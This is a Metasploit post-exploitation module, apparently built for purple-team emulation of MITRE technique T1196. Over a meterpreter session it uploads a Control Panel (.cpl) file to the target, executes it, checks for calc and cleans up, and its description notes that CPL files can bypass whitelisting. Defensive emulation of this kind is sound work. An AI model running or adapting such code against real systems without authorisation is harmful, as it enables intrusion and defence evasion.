##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Purple
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Control Panel Items (T1196) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion, Execution:
                        Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.

                        For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.

                        Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via Spearphishing Attachment campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1196' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new('LPATH', [ false, 'Local file to copy to remote host.', Msf::Config.data_directory + "/purple/t1196/t1196_[x86|x64].cpl"]),
      OptString.new('RPATH', [ true, 'Path to upload CPL file to','C:\\1196.cpl']),
      OptBool.new('CLEANUP', [true, "Cleanup", true])
    ])
  end

  def run
    begin
      return 0 if session.type != "meterpreter"

      remote_file_path = datastore['RPATH']
      local_file_path = datastore['LPATH'].sub!(/\[x86\|x64\]/, (client.arch == ARCH_X86 ? "x86" : "x64"))

      print_status("Checking for calc running")
      check_for_calc


      print_status("Uploading cpl file")
      unless exist?(remote_file_path)
        upload_file(remote_file_path, local_file_path)
      end

      print_status("Executing cpl file")
      cmd=remote_file_path
      run_cmd(cmd, false)

      print_status("Sleeping for 3 seconds")

      sleep(3)

      check_for_calc

      if datastore['CLEANUP']
        print_status("Cleaning up local files")
        register_files_for_cleanup(remote_file_path)
        print_status("Attempting to kill calc")
        kill_calc(true)
      end
      print_good("Module T1196 execution successful.")
    rescue ::Exception => e
      print_status("Unable to execute: #{e.message}")
      print_error("Module T1196 execution failed.")
      return
    end
  end
end
